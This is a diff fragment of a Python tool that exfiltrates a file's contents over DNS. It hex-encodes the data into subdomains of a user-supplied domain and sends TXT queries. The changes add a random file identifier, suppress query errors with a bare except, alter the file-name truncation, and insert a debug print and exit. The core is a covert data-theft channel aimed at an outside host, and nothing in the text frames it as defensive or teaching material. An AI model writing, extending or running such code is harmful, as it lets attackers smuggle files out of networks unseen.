@@ -6,7 +6,6 @@ import argparse
 import random
 import string
 
-nonce='x6hq4'
 parser = argparse.ArgumentParser()
 parser.add_argument('--domain','-d',required=True)
 parser.add_argument('--file','-f',required=True)
@@ -27,15 +26,20 @@ def make_query(missing_piece):
 	"""serialize the data"""
 	encoded_string = binascii.hexlify(string.encode('utf-8'))
 	"""put together the dns query"""
-	tld = ("d.%s.%s.%s"%(encoded_string.decode('utf-8'),nonce,args.domain))
+	tld = ("d.%s.%s.%s"%(encoded_string.decode('utf-8'),file_id,args.domain))
 	"""do it!"""
-	dns.resolver.query(tld,'TXT')
+	try:
+		dns.resolver.query(tld,'TXT')
+	except:
+		pass
 
 num = 1
 file_id =  random_string_digits()
 
-'''parse out a file name and shorten it to 12 chars'''
-header = args.file.split('/')[-1]
+'''parse out a file name and shorten it to 19 chars'''
+header = args.file[-19:]
+print(header)
+exit()
 
 with open (args.file,"r") as work_file:
 	make_query(header)
